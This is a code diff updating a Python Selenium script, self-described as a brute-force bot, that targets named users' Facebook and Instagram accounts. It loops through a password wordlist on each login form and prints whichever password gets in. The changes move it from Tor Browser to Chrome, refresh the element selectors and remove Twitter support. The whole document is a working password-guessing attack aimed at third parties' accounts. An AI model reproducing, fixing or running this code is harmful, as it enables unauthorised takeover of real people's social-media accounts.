@@ -5,8 +5,13 @@ BRUTEFORCE BOT FOR ANY SOCIAL-MEDIA
 """
 
 from selenium import webdriver
+from selenium.webdriver.common.by import By
 from selenium.common.exceptions import NoSuchElementException
+from selenium.common.exceptions import StaleElementReferenceException
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions
 from tbselenium.tbdriver import TorBrowserDriver
+from selenium.webdriver.common.keys import Keys
 import sys
 import time
 
@@ -20,7 +25,9 @@ class brute_bot(object):
         self.pass_field = pass_field
         self.threads = threads
         self.login_btn = login_btn
-        self.driver = TorBrowserDriver()  # Enter here directory if TOR Browser
+        self.chrome_options = webdriver.ChromeOptions()
+        self.chrome_options.add_argument("--no-sandbox")
+        self.driver = webdriver.Chrome(chrome_options=self.chrome_options)
 
     def bruteforcer(self):
         driver = self.driver
@@ -28,19 +35,17 @@ class brute_bot(object):
         driver.get(self.site)
 
         if sys.argv[1] == 'facebook':
-            email_box = driver.find_element_by_name(f'{self.email_field}')
+            email_box = driver.find_element(By.ID, self.email_field)
             email_box.clear()
             email_box.send_keys(self.email)
 
             while not pass_found:
                 for i in self.password:
                     try:
-                        password_box = driver.find_element_by_name(self.pass_field)
+                        password_box = driver.find_element(By.ID, self.pass_field)
                         password_box.clear()
                         password_box.send_keys(i)
-                        log_site = driver.find_element_by_name(self.login_btn)
-                        log_site.click()
-                        #pyautogui.press("return")
+                        email_box.send_keys(Keys.RETURN)
                         time.sleep(int(sys.argv[3]))
                         old = i
                         print(f"Trying - {i}")
@@ -53,40 +58,17 @@ class brute_bot(object):
 
         elif sys.argv[1] == "instagram":
             time.sleep(2)
-            email_box = driver.find_element_by_xpath(f"//input[@name='{self.email_field}']")
+            email_box = driver.find_element(By.NAME, self.email_field)
             email_box.clear()
             email_box.send_keys(self.email)
 
             while not pass_found:
                 for i in self.password:
                     try:
-                        password_box = driver.find_element_by_xpath(f"//input[@name='{self.pass_field}']")
+                        password_box = driver.find_element(By.NAME, self.pass_field)
                         password_box.clear()
                         password_box.send_keys(i)
-                        log_site = driver.find_element_by_class_name(f'{self.login_btn}')
-                        log_site.click()
-                        time.sleep(int(sys.argv[3]))
-                        old = i
-                        print(f"Trying - {i}")
-                    except NoSuchElementException:
-                        pass_found = True
-                        if pass_found == True:
-                            print(f'Password is >> {old} ')
-                            driver.close()
-                            break
-
-        elif sys.argv[1] == "twitter":
-            email_box = driver.find_element_by_class_name(f'{self.email_field}')
-            email_box.clear()
-            email_box.send_keys(self.email)
-
-            while not pass_found:
-                for i in self.password:
-                    try:
-                        password_box = driver.find_element_by_class_name(f'{self.pass_field}')
-                        password_box.clear()
-                        password_box.send_keys(i)
-                        pyautogui.press('enter')
+                        email_box.send_keys(Keys.RETURN)
                         time.sleep(int(sys.argv[3]))
                         old = i
                         print(f"Trying - {i}")
@@ -122,7 +104,7 @@ def main_menu():
         print("Waking up BOT...")
         efield = 'email'
         pfield = 'pass'
-        loginbutton = 'login'
+        loginbutton = 'loginbutton'
         email1 = str(input("\nThe ID of the target >> "))
         target = open(sys.argv[2], 'r')
         readpass = target.readlines()
@@ -135,21 +117,8 @@ def main_menu():
         print("Waking up BOT...")
         efield = 'username'
         pfield = 'password'
-        loginbutton = 'L3NKy'
+        loginbutton = '_ab8w  _ab94 _ab99 _ab9f _ab9m _ab9p  _abak _abb8 _abbq _abb- _abcm'
         email1 = str(input("\nThe Username of the Target >> "))
-        target = open(sys.argv[2], 'r')
-        readpass = target.readlines()
-        execute = brute_bot(email1, readpass, site, efield, pfield, int(sys.argv[3]), loginbutton)
-        execute.bruteforcer()
-
-    elif sys.argv[1] == "twitter":
-        site = "https://twitter.com/login/"
-        print(banner)
-        print("Waking up BOT...")
-        efield = 'js-username-field'
-        pfield = 'js-password-field'
-        loginbutton = 'Igw0E'
-        email1 = str(input("\nThe Username/Email of the Target >> "))
         target = open(sys.argv[2], 'r')
         readpass = target.readlines()
         execute = brute_bot(email1, readpass, site, efield, pfield, int(sys.argv[3]), loginbutton)
@@ -160,7 +129,7 @@ if __name__ == "__main__":
         if len(sys.argv) < 4:
             print(f"""
             {banner}
-            \nUsage: python3 {sys.argv[0]} [facebook/instagram/twitter] [wordlist] [threads]\n\n
+            \nUsage: python3 {sys.argv[0]} [facebook/instagram] [wordlist] [threads]\n\n
             """)
         elif len(sys.argv) == 4:
             main_menu()
